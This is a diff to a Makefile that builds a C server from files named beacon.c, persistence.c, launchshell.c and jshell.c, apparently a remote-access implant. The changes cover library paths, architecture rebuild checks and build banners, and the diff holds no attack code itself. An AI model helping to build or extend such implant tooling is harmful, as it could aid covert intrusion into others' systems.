@@ -41,12 +41,16 @@ LIB = .
 
 COMMON = ../common
 CRYPTO = $(COMMON)/crypto
-SSL = $(COMMON)/ssl
+SSL = $(COMMON)/ssl/library
 BZIP2 = $(COMMON)/bzip2
 INCLUDES = -I$(SSL)/include -I$(BZIP2) -I../common -I.
-LIBSSL = $(SSL)/library/libpolarssl.a
+LIBSSL = $(SSL)/libpolarssl.a
 LIBBZIP2 = $(BZIP2)/libbz2.a
 LIBCRYPTO = $(CRYPTO)/libcrypto.a
+
+include $(BZIP2)/ARCH_BUILD
+include $(CRYPTO)/ARCH_BUILD
+include $(SSL)/ARCH_BUILD
 
 SERVER_SRCS =	beacon.c persistence.c launchshell.c \
 		shuffle.c twofish.c farm9crypt.c jshell.c \
@@ -61,7 +65,7 @@ SERVER_SRCS =	beacon.c persistence.c launchshell.c \
 LIBS = $(LIBBZIP2) $(LIBCRYPTO) $(LIBSSL) $(LIBCRYPTO)
 
 # Debug Configuration
-PS = process_list.cpolarssl-1.1.8/library/Makefile
+PS = process_list.c
 NETSTAT = netstat_an.c netstat_rn.c
 IFC = ifconfig.c
 DBGFLAGS += -DDEBUG -D_DEBUG -g
@@ -74,17 +78,48 @@ OS = $(shell uname)
 #ARCH = $(shell uname -m)
 #ARCH=x86
 #endif
+.PHONY: force-rebuild
+ifdef ARCH_BUILD_BZIP2
+  ifneq ("$(ARCH_BUILD_BZIP2)", "$(TARGET)")
+    BZIP2_REBUILD:=force-rebuild
+  else
+    BZIP2_REBUILD:=
+  endif
+else
+  BZIP2_REBUILD:=force-rebuild
+endif
+
+ifdef ARCH_BUILD_CRYPTO
+  ifneq ("$(ARCH_BUILD_CRYPTO)", "$(TARGET)")
+    CRYPTO_REBUILD:=force-rebuild
+  else
+    CRYPTO_REBUILD:=
+  endif
+else
+  CRYPTO_REBUILD:=force-rebuild
+endif
+
+ifdef ARCH_BUILD_SSL
+  ifneq ("$(ARCH_BUILD_SSL)", "$(TARGET)")
+    SSL_REBUILD:=force-rebuild
+  else
+    SSL_REBUILD:=
+  endif
+else
+  SSL_REBUILD:=force-rebuild
+endif
 
 SERVER = $(SERVER_BASENAME)-$(TARGET)
 
 $(info )
-$(info =================================================)
+$(info )
+$(info =========================================================================)
 $(info .       BUILDING $(SERVER))
-$(info =================================================)
+$(info =========================================================================)
 $(info TARGET: $(TARGET))
 $(info SRCDIR: $(PWD))
 $(info CFLAGS: $(CFLAGS))
-$(info =================================================)
+$(info =========================================================================)
 $(info )
 
 .SILENT:
@@ -92,14 +127,17 @@ $(info )
 .PHONY: all
 all: $(SERVER) $(SERVER)-dbg
 
-$(LIBSSL):
-	cd $(SSL)/library && $(MAKE) TARGET=$(TARGET)
+$(LIBSSL): $(SSL_REBUILD)
+	cd $(SSL) && $(MAKE) TARGET=$(TARGET)
 
-$(LIBBZIP2):
-	cd $(BZIP2) && $(MAKE) -f Makefile.linux-x86 libbz2.a
+$(LIBBZIP2): $(BZIP2_REBUILD)
+	cd $(BZIP2) && $(MAKE) TARGET=$(TARGET)
 
-$(LIBCRYPTO):
+.PHONY: rebuild-crypto
+$(LIBCRYPTO): $(CRYPTO_REBUILD)
 	cd $(CRYPTO) && $(MAKE) TARGET=$(TARGET)
+rebuild-crypto:
+	cd $(CRYPTO) && $(MAKE) TARGET=$(TARGET) clean
 
 .PHONY: debug
 debug: $(SERVER)-dbg
@@ -150,7 +188,7 @@ string_utils.o: string_utils.h string_utils.c
 	$(CC) -c $(CFLAGS) string_utils.c 
 
 .PHONY: clean
-clean:
+clean:	$(SERVER)
 	make -f ./Makefile clean
 
 .PHONY: svnclean
